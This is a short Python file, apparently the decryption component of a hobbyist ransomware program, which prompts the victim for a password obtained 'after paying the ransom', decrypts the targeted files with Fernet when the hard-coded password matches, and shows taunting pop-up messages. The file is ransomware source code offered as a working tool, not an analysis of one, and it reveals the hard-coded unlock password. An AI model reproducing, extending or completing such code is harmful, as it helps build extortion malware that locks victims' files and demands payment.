import os
from tools import *
from cryptography.fernet import Fernet

files = addFiles()

# --- DECRYPTION ---

password = "bigbutts"

guess = input("Please enter the password you have been given after paying the ransom: \n")

if guess == password: 
    for file in files:
        with open(file, "rb")as thefile:
            encryptedContent = thefile.read()
        decryptedContent = Fernet(getKey()).decrypt(encryptedContent)
        with open(file, "wb") as thefile:
            thefile.write(decryptedContent)

        print(file + " has been decrypted")
    MBox("Oh, this is awkward-","I guess you figured out my secret code",0)
else:
    MBox('WRONG PASSWORD','Come on man... you really thought you could guess this... its ransomware not ur moms laptop password',0)